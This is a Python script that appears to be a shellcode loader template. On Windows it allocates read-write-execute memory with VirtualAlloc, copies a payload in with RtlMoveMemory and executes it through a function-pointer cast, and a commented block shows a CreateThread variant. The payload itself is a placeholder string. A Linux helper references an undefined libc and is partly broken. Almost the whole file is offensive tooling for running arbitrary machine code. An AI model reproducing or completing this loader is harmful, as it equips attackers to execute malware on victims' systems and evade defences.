from ctypes import *
import ctypes

#libc = CDLL('libc.so.6')

# Some constants
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4

def executable_code(buffer):
    """Return a pointer to a page-aligned executable buffer filled in with the data of the string provided.
    The pointer should be freed with libc.free() when finished"""

    buf = c_char_p(buffer)
    size = len(buffer)
    # Need to align to a page boundary, so use valloc
    addr = libc.valloc(size)
    addr = c_void_p(addr)

    if 0 == addr:  
        raise Exception("Failed to allocate memory")

    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr

buf =  "INSERT SHELLCODE HERE"


VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc

VirtualProtect = ctypes.windll.kernel32.VirtualProtect

shellcode = bytearray(buf)

memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
"""
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(memorywithshell),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
"""
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()
